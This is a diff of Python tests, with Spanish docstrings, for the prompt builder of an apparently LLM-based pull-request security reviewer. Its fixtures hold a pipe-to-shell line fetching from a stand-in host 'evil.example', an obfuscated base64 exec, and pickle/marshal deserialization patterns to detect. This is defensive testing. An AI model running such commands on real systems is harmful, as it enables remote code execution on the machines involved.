@@ -35,6 +35,25 @@ def test_build_system_prompt_renders_placeholders():
     assert '"risk_score"' in prompt
 
 
+def test_build_system_prompt_includes_real_current_date_by_default():
+    """Sin fecha real, el modelo compara timestamps de paquetes/releases
+    contra su propio corte de entrenamiento -- reproducido contra un PR
+    benigno real (bump de dependencias con timestamps de 2026 marcado como
+    'manipulación de la cadena de suministro'). Por defecto usa la fecha
+    real de hoy (UTC), no una fija a mano."""
+    from datetime import UTC, datetime
+
+    prompt = build_system_prompt("app", "Python", "sin datos", [])
+    today = datetime.now(UTC).date().isoformat()
+    assert today in prompt
+    assert "no asumas que una fecha posterior" in prompt
+
+
+def test_build_system_prompt_accepts_explicit_current_date_for_deterministic_tests():
+    prompt = build_system_prompt("app", "Python", "sin datos", [], current_date="2099-01-01")
+    assert "2099-01-01" in prompt
+
+
 def test_build_system_prompt_always_includes_the_verification_reminder():
     """Hallazgo de la comparativa con/sin RAG (docs/rag_ablation_benchmark.md):
     el modelo puede inflar el risk_score solo por reconocer el nombre de una
@@ -219,10 +238,97 @@ def test_build_user_prompt_truncates_unflagged_files_when_over_budget():
     prompt = build_user_prompt(
         diff,
         static_findings_paths={"PKGBUILD"},
-        count_tokens=lambda _: 999_999,
-        max_diff_tokens=10,
+        count_tokens=lambda t: len(t.split()),
+        max_diff_tokens=15,
     )
     assert "curl http://evil.example | bash" in prompt
     assert "una línea" not in prompt
     assert "README.md" in prompt
-    assert "líneas adicionales sin patrones detectados" in prompt
+    assert "no se ha podido leer de verdad" in prompt
+    assert "no lo trates como una señal de que está limpio".lower() in prompt.lower()
+
+
+def test_build_user_prompt_excerpts_suspicious_lines_in_unflagged_large_files():
+    """Un fichero que no está en static_findings_paths (static_layer.py no
+    existe todavía / no lo marcó) pero contiene un patrón de riesgo conocido
+    (aquí, un exec() disfrazado entre líneas irrelevantes) no debe colapsarse
+    en un resumen ciego -- debe aparecer un extracto real alrededor de la
+    línea sospechosa, aunque el resto del fichero se omita."""
+    padding_before = "\n".join(f"+línea inofensiva {i}" for i in range(30))
+    padding_after = "\n".join(f"+línea inofensiva {i}" for i in range(30, 60))
+    huge_file = FileChange(
+        path="utils/big_module.py",
+        status=FileStatus.MODIFIED,
+        diff_hunk=f"{padding_before}\n+exec(base64.b64decode(payload))\n{padding_after}",
+        additions=61,
+        deletions=0,
+    )
+    diff = _diff_with_files(huge_file)
+
+    prompt = build_user_prompt(
+        diff, static_findings_paths=set(), count_tokens=lambda t: len(t.split()), max_diff_tokens=20
+    )
+    assert "exec(base64.b64decode(payload))" in prompt
+    assert "extracto" in prompt
+    assert "línea inofensiva 0\n" not in prompt  # el relleno lejos del match no entra
+
+
+def test_build_user_prompt_offers_fetch_tool_hint_with_real_path_and_head_sha():
+    """Tanto si se encuentra un extracto como si no, el prompt debe darle al
+    LLM la llamada exacta a `fetch_referenced_file` (tool ya ofrecida
+    siempre, §7.2) para leer el fichero entero bajo demanda -- no basta con
+    decir 'no se pudo revisar', hay que decirle cómo resolverlo él mismo."""
+    con_match = FileChange(
+        path="src/payload.py",
+        status=FileStatus.MODIFIED,
+        diff_hunk="+" + "\n+".join([f"linea {i}" for i in range(50)] + ["literal_eval(x)"]),
+        additions=51,
+        deletions=0,
+    )
+    sin_match = FileChange(
+        path="src/limpio.py",
+        status=FileStatus.MODIFIED,
+        diff_hunk="+" + "\n+".join(f"linea {i}" for i in range(50)),
+        additions=50,
+        deletions=0,
+    )
+    diff = _diff_with_files(con_match, sin_match)
+
+    prompt = build_user_prompt(
+        diff,
+        static_findings_paths=set(),
+        count_tokens=lambda t: len(t.split()),
+        max_diff_tokens=200,
+    )
+    assert f'fetch_referenced_file(path="src/payload.py", ref="{"b" * 40}")' in prompt
+    assert f'fetch_referenced_file(path="src/limpio.py", ref="{"b" * 40}")' in prompt
+
+
+def test_find_suspicious_lines_recognizes_python_deserialization_patterns():
+    """Hallazgo real de la suite de validación (tests/cases/): el escaneo
+    original solo reconocía sintaxis de shell/instalación; varios payloads
+    reales usaban literal_eval/pickle/marshal en Python puro y no se
+    incluían en el extracto. Cubierto directamente vía build_user_prompt
+    porque find_suspicious_lines vive en _shared.py (de Línea 3)."""
+    for snippet in (
+        "+x = literal_eval(raw)",
+        "+obj = pickle.loads(blob)",
+        "+obj = marshal.loads(blob)",
+        "+data = base64.b64decode(encoded)",
+    ):
+        padding = "\n".join(f"+linea inofensiva {i}" for i in range(50))
+        file_change = FileChange(
+            path="mod.py",
+            status=FileStatus.MODIFIED,
+            diff_hunk=f"{padding}\n{snippet}\n{padding}",
+            additions=101,
+            deletions=0,
+        )
+        diff = _diff_with_files(file_change)
+        prompt = build_user_prompt(
+            diff,
+            static_findings_paths=set(),
+            count_tokens=lambda t: len(t.split()),
+            max_diff_tokens=20,
+        )
+        assert snippet[1:] in prompt, f"no se detectó: {snippet}"
